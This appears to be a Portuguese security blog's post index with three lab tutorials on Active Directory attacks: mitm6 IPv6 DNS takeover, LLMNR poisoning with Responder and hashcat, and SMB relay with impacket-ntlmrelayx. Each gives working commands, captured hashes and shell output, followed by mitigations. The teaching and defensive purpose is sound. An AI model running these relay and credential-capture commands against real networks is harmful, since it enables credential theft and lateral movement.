[{"content":"Definição Na instalação de um sistema operativo Windows por defeito temos no interface de rede o protocolo IPV6 activo, devido a isso existe trafego por IPV6 para a rede. Um exemplo pratico são as queries DNS que saem por IPV6, como normalmente o nosso servidor DNS não responde a IPV6 podemos-nos colocar como um servidor DNS malicioso que irá escutar todos os pedidos e aceder aos pedidos de autenticação, sejam eles por exemplo LDAP ou SMB.\nCenário Exploração (PoC) iniciamos o nosso listner IPV6 e fazemos relay para o nosso controlador de dominio.\nmitm6 -d insecure.local sudo impacket-ntlmrelayx -6 -t ldaps://192.168.0.100 -wh fakewpad.insecure.local -l lab/labad/lootme Após um login ou uma máquina ficar activa verificamos que o trafego IPV6 é relayed para o nosso controlador de dominio, desta forma ficamos com muita informação sobre o dominio.\nAo abrirmos estes ficheiros ficamos com muita informação do dominio, podendo-se verificar que utilizadores existem e a que grupos pertencem,\nCaso algum administrador de dominio faça login é criado um user de forma automática com permissões de DCSync o que nos permitirá evoluir para outro tipo de exploração.\nMitigação Devemos desabilitar por GPO a aplicação das configurações IPV6 na nossa organização, caso não esteja em uso.\n","permalink":"https://www.insecure.pt/posts/mitm6/","summary":"Definição Na instalação de um sistema operativo Windows por defeito temos no interface de rede o protocolo IPV6 activo, devido a isso existe trafego por IPV6 para a rede. Um exemplo pratico são as queries DNS que saem por IPV6, como normalmente o nosso servidor DNS não responde a IPV6 podemos-nos colocar como um servidor DNS malicioso que irá escutar todos os pedidos e aceder aos pedidos de autenticação, sejam eles por exemplo LDAP ou SMB.","title":"IPV6 DNS Takeover via mitm6"},{"content":"Definição LLMNR é um acrónimo de Link-Local Multicast Resolution, está activo por defeito e é usado para resolução de nomes quando não existe resposta do DNS ao pedido.\nNa pratica é enviado, em ultimo recurso, um pedido para todo o segmento de rede onde a máquina se encontra na tentativa que o pedido seja respondido por alguem que consiga resolver o nome.\nA vulnerabilidade deste serviço existe na resposta, sendo enviado o utilizador e a hash da password que pode assim ser extraida dependendo da complexidade da mesma.\nÉ um ataque do tipo Man in the Middle (MITM), em que o atacante responde ao pedido e guarda informação de acesso do utilizador.\nO utilizador pretende aceder a uma pasta de rede inexistente com o nome \\\\ZEMANEL; O DNS falha em responder porque não conhece o recurso; É enviado para a rede o mesmo pedido por LLMNR; A maquina do atacante diz que tem o recurso localmente; É enviado o user e o hash da password para o atacante para que inicie a autenticação. Desta forma o atacante fica com a possibilidade de extrair a password do hash que recebeu para se autenticar, iniciando assim o primeiro passo para acesso ao dominio.\nExploração (PoC) Iniciar o responder sudo responder -I eth0 -wd o utilizador tenta aceder a uma pasta de rede que não existe. O responder indica ao utilizador jcid dizendo que é ele o destino e é enviado o user e a hash da password Copiamos a hash para um ficheiro e iniciamos o processo de extração da password a partir da hash. Iremos utilizar a ferramenta hashcat para o efeito, existem outras opções como o John the ripper\nO tipo de hash é NTLMV2\nhashcat -m 5600 jcid.hash /usr/share/wordlists/rockyou.txt E a partir deste momento já conhecemos o user/dominio assim como a password do utilizador, neste ponto podemos iniciar a exploração da Active Directory, visto que já temos credenciais validas.\nInformação adicional Este tipo de ataque é muito eficaz logo pelo manhã quando os utilizadores chegam ao local de trabalho e depois de almoço. Visto que nessa altura é quando estes começam a aceder a drives partilhadas e/ou a outros serviços.\nMitigação Em \u0026ldquo;Group Policy Editor\u0026rdquo; \u0026gt; Local Computer Policy \u0026gt; Computer Configuration \u0026gt; Administrative Templates \u0026gt; Network \u0026gt; DNS Client colocar \u0026ldquo;Turn OFF Multicast Name Resolution\u0026rdquo; como enable. ","permalink":"https://www.insecure.pt/posts/ad_llmnr/","summary":"Definição LLMNR é um acrónimo de Link-Local Multicast Resolution, está activo por defeito e é usado para resolução de nomes quando não existe resposta do DNS ao pedido.\nNa pratica é enviado, em ultimo recurso, um pedido para todo o segmento de rede onde a máquina se encontra na tentativa que o pedido seja respondido por alguem que consiga resolver o nome.\nA vulnerabilidade deste serviço existe na resposta, sendo enviado o utilizador e a hash da password que pode assim ser extraida dependendo da complexidade da mesma.","title":"LLMNR Poisoning"},{"content":"Definição Em vez de capturarmos as hashes e tentarmos extrair a password podendo não existir sucesso devido à sua complexidade. Este ataque usa a hash capturada e encaminha para ganhar acesso noutra maquina, fazendo relay da hash. Em caso de sucesso este ataque é usado para movimentação lateral dentro de um dominio.\nCenário O cenário é constituido por duas workstations em que o utilizador José Cid é local administrator nas duas maquinas (WS01 e WS02). O SMB Signing encontra-se desabilitado.\nRequisitos Para que este ataque seja possivel, o ambiente tem de ter os seguintes requisitos:\nSMB Signing disabled; O utilizador tem de ser administrator local das maquinas envolvidas. Enumeração SMB Signing Disabled O primeiro passo é verificar se o SMB Signing está inactivo e para isso usaremos o nmap com o comando abaixo:\nnmap -Pn --script=smb2-security-mode.nse -p 445 \u0026lt;IP\u0026gt; ou\nnmap -Pn --script=smb2-security-mode.nse -p 445 \u0026lt;IP\u0026gt;/\u0026lt;CIDR\u0026gt; Podemos verificar que está activo mas não é obrigatório o seu uso, desta forma é vulnerável.\nExploração (PoC) Configuração do responder Como o objectivo é reenviar a hash que iremos receber para outra workstation iremos configurar o responder . Teremos que desabilitar\nsudo vi /etc/responder/Responder.conf sudo responder -I eth0 -wdv De seguida iremos utilizar uma ferramenta da impacket para fazer relay da hash para a outra máquina com o objectivo de ganharmos acesso sobre a mesma, para que isso seja possivel o utilizador terá de ser local administrator da maquina que iremos tentar comprometer.\nimpacket-ntlmrelayx -t 192.168.0.102 -smb2support\n┌──(kali㉿insecure)-[~] └─$ impacket-ntlmrelayx -t 192.168.0.102 -smb2support Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Protocol Client LDAPS loaded.. [*] Protocol Client LDAP loaded.. [*] Protocol Client MSSQL loaded.. [*] Protocol Client DCSYNC loaded.. [*] Protocol Client RPC loaded.. [*] Protocol Client HTTP loaded.. [*] Protocol Client HTTPS loaded.. [*] Protocol Client SMB loaded.. [*] Protocol Client IMAPS loaded.. [*] Protocol Client IMAP loaded.. [*] Protocol Client SMTP loaded.. [*] Running in relay mode to single host [*] Setting up SMB Server [*] Setting up HTTP Server on port 80 [*] Setting up WCF Server [*] Setting up RAW Server on port 6666 [*] Servers started, waiting for connections Iniciamos o ataque atraves de LLMNR\n*] [DHCP] Found DHCP server IP: 192.168.0.22, now waiting for incoming requests...\r[*] [MDNS] Poisoned answer sent to 192.168.0.101 for name WS01.local\r[*] [MDNS] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01.local\r[*] [LLMNR] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01\r[*] [LLMNR] Poisoned answer sent to 192.168.0.101 for name WS01\r[*] [MDNS] Poisoned answer sent to 192.168.0.101 for name WS01.local\r[*] [LLMNR] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01\r[*] [LLMNR] Poisoned answer sent to 192.168.0.101 for name WS01\r[*] [MDNS] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01.local\r[*] [MDNS] Poisoned answer sent to 192.168.0.101 for name WS01.local\r[*] [LLMNR] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01\r[*] [MDNS] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01.local\r[*] [LLMNR] Poisoned answer sent to 192.168.0.101 for name WS01\r[*] [MDNS] Poisoned answer sent to 192.168.0.101 for name WS01.local\r[*] [MDNS] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01.local\r[*] [LLMNR] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01\r[*] [LLMNR] Poisoned answer sent to 192.168.0.101 for name WS01\r[*] [MDNS] Poisoned answer sent to 192.168.0.102 for name WS02.local\r[*] [MDNS] Poisoned answer sent to fe80::3066:d170:a156:1320 for name WS02.local\r[*] [LLMNR] Poisoned answer sent to fe80::3066:d170:a156:1320 for name WS02\r[*] [LLMNR] Poisoned answer sent to 192.168.0.102 for name WS02\r[*] [MDNS] Poisoned answer sent to 192.168.0.102 for name WS02.local\r[*] [MDNS] Poisoned answer sent to fe80::3066:d170:a156:1320 for name WS02.local E temos agora à disposição as hashes dos utilizadores locais da maquina de destino, que poderemos utilizar para lateral movement.\n┌──(kali㉿insecure)-[~]\r└─$ impacket-ntlmrelayx -t 192.168.0.102 -smb2support\rImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\r[*] Protocol Client LDAPS loaded..\r[*] Protocol Client LDAP loaded..\r[*] Protocol Client MSSQL loaded..\r[*] Protocol Client DCSYNC loaded..\r[*] Protocol Client RPC loaded..\r[*] Protocol Client HTTP loaded..\r[*] Protocol Client HTTPS loaded..\r[*] Protocol Client SMB loaded..\r[*] Protocol Client IMAPS loaded..\r[*] Protocol Client IMAP loaded..\r[*] Protocol Client SMTP loaded..\r[*] Running in relay mode to single host\r[*] Setting up SMB Server\r[*] Setting up HTTP Server on port 80\r[*] Setting up WCF Server\r[*] Setting up RAW Server on port 6666\r[*] Servers started, waiting for connections\r[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.0.101, attacking target smb://192.168.0.102\r[*] Authenticating against smb://192.168.0.102 as INSECURE/JCID SUCCEED\r[*] Service RemoteRegistry is in stopped state\r[*] Service RemoteRegistry is disabled, enabling it\r[*] Starting service RemoteRegistry\r[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.0.101 controlled, but there are no more targets left!\r[*] Target system bootKey: 0xdef8c5bdb9e10578190e9f3751969b65\r[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\rAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9ebbbaa98c9ab926aae0a26b1a7945ca:::\rtest:1003:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::\r[*] Done dumping SAM hashes for host: 192.168.0.102\r[*] Stopping service RemoteRegistry\r[*] Restoring the disabled state for service RemoteRegistry\r[*] SMBD-Thread-9 (process_request_thread): Connection from 192.168.0.101 controlled, but there are no more targets left! Shell Interactiva Com a opção -i (interactive) a ferramenta cria uma reverse shell que poderemos aceder atraves da nossa maquina.\n** [*] Started interactive SMB client shell via TCP on 127.0.0.1:11000 **\n┌──(kali㉿insecure)-[~]\r└─$ impacket-ntlmrelayx -t 192.168.0.102 -smb2support -i\rImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\r[*] Protocol Client LDAP loaded..\r[*] Protocol Client LDAPS loaded..\r[*] Protocol Client MSSQL loaded..\r[*] Protocol Client DCSYNC loaded..\r[*] Protocol Client RPC loaded..\r[*] Protocol Client HTTP loaded..\r[*] Protocol Client HTTPS loaded..\r[*] Protocol Client SMB loaded..\r[*] Protocol Client IMAP loaded..\r[*] Protocol Client IMAPS loaded..\r[*] Protocol Client SMTP loaded..\r[*] Running in relay mode to single host\r[*] Setting up SMB Server\r[*] Setting up HTTP Server on port 80\r[*] Setting up WCF Server\r[*] Setting up RAW Server on port 6666\r[*] Servers started, waiting for connections\r[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.0.101, attacking target smb://192.168.0.102\r[*] Authenticating against smb://192.168.0.102 as INSECURE/JCID SUCCEED\r[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000\r[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.0.101 controlled, but there are no more targets left!\r[*] SMBD-Thread-8 (process_request_thread): Connection from 192.168.0.101 controlled, but there are no more targets left! Para tal basta abrir uma sessão com netcat para o IP/Porto que a nossa sessão está estabecida.\n┌──(kali㉿insecure)-[~]\r└─$ nc -nv 127.0.0.1 11000\r(UNKNOWN) [127.0.0.1] 11000 (?) open\rType help for list of commands\r# ?\ropen {host,port=445} - opens a SMB connection against the target host/port\rlogin {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it\u0026#39;ll be prompted\rkerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it\u0026#39;ll be prompted. Use the DNS resolvable domain name\rlogin_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes\rlogoff - logs off\rshares - list available shares\ruse {sharename} - connect to an specific share\rcd {path} - changes the current directory to {path}\rlcd {path} - changes the current local directory to {path}\rpwd - shows current remote directory\rpassword - changes the user password, the new password will be prompted for input\rls {wildcard} - lists all the files in the current directory\rrm {file} - removes the selected file\rmkdir {dirname} - creates the directory under the current path\rrmdir {dirname} - removes the directory under the current path\rput {filename} - uploads the filename into the current path\rget {filename} - downloads the filename from the current path\rmget {mask} - downloads all files from the current directory matching the provided mask\rcat {filename} - reads the filename from the current path\rmount {target,path} - creates a mount point from {path} to {target} (admin required)\rumount {path} - removes the mount point at {path} without deleting the directory (admin required)\rlist_snapshots {path} - lists the vss snapshots for the specified path\rinfo - returns NetrServerInfo main results\rwho - returns the sessions currently connected at the target host (admin required)\rclose - closes the current SMB Session\rexit - terminates the server process (and this session) É possivel ainda enviar commandos, o exemplo abaixo mostra o output mas na prática até nos possivel enviar oneliners para criação de uma reverse shell.\n└─$ impacket-ntlmrelayx -t 192.168.0.102 -smb2support -c \u0026#34;whoami /priv\u0026#34;\rImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\r[*] Protocol Client LDAP loaded..\r[*] Protocol Client LDAPS loaded..\r[*] Protocol Client MSSQL loaded..\r[*] Protocol Client DCSYNC loaded..\r[*] Protocol Client RPC loaded..\r[*] Protocol Client HTTPS loaded..\r[*] Protocol Client HTTP loaded..\r[*] Protocol Client SMB loaded..\r[*] Protocol Client IMAPS loaded..\r[*] Protocol Client IMAP loaded..\r[*] Protocol Client SMTP loaded..\r[*] Running in relay mode to single host\r[*] Setting up SMB Server\r[*] Setting up HTTP Server on port 80\r[*] Setting up WCF Server\r[*] Setting up RAW Server on port 6666\r[*] Servers started, waiting for connections\r[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.0.101, attacking target smb://192.168.0.102\r[*] Authenticating against smb://192.168.0.102 as INSECURE/JCID SUCCEED\r[*] Service RemoteRegistry is in stopped state\r[*] Service RemoteRegistry is disabled, enabling it\r[*] Starting service RemoteRegistry\r[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.0.101 controlled, but there are no more targets left!\r[*] Executed specified command on host: 192.168.0.102\rPRIVILEGES INFORMATION\r----------------------\rPrivilege Name Description State\r========================================= ================================================================== ========\rSeAssignPrimaryTokenPrivilege Replace a process level token Disabled\rSeLockMemoryPrivilege Lock pages in memory Enabled\rSeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled\rSeTcbPrivilege Act as part of the operating system Enabled\rSeSecurityPrivilege Manage auditing and security log Disabled\rSeTakeOwnershipPrivilege Take ownership of files or other objects Disabled\rSeLoadDriverPrivilege Load and unload device drivers Disabled\rSeSystemProfilePrivilege Profile system performance Enabled\rSeSystemtimePrivilege Change the system time Disabled\rSeProfileSingleProcessPrivilege Profile single process Enabled\rSeIncreaseBasePriorityPrivilege Increase scheduling priority Enabled\rSeCreatePagefilePrivilege Create a pagefile Enabled\rSeCreatePermanentPrivilege Create permanent shared objects Enabled\rSeBackupPrivilege Back up files and directories Disabled\rSeRestorePrivilege Restore files and directories Disabled\rSeShutdownPrivilege Shut down the system Disabled\rSeDebugPrivilege Debug programs Enabled\rSeAuditPrivilege Generate security audits Enabled\rSeSystemEnvironmentPrivilege Modify firmware environment values Disabled\rSeChangeNotifyPrivilege Bypass traverse checking Enabled\rSeUndockPrivilege Remove computer from docking station Disabled\rSeManageVolumePrivilege Perform volume maintenance tasks Disabled\rSeImpersonatePrivilege Impersonate a client after authentication Enabled\rSeCreateGlobalPrivilege Create global objects Enabled\rSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\rSeTimeZonePrivilege Change the time zone Enabled\rSeCreateSymbolicLinkPrivilege Create symbolic links Enabled\rSeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled\r[*] Stopping service RemoteRegistry\r[*] Restoring the disabled state for service RemoteRegistry\r[*] SMBD-Thread-8 (process_request_thread): Connection from 192.168.0.101 controlled, but there are no more targets left! Mitigação Habititar SMB Signing como obrigatório. Pode ser feito por GPO para toda a organização, devemos ter em conta que esta configuração poderá criar latência em cerca de 50% na transferência de ficheiros.\nhttps://www.rootusers.com/configure-smb-signing-via-group-policy/\nAccount Tiering Garantir que os utilizadors dependendo da seu nivel de acesso só acedem a servidores especificos e não permitir que os utilizadores sejam local admins das suas máquinas.\n","permalink":"https://www.insecure.pt/posts/ad_smbrelay/","summary":"Definição Em vez de capturarmos as hashes e tentarmos extrair a password podendo não existir sucesso devido à sua complexidade. Este ataque usa a hash capturada e encaminha para ganhar acesso noutra maquina, fazendo relay da hash. Em caso de sucesso este ataque é usado para movimentação lateral dentro de um dominio.\nCenário O cenário é constituido por duas workstations em que o utilizador José Cid é local administrator nas duas maquinas (WS01 e WS02).","title":"SMB Relay Attack"}]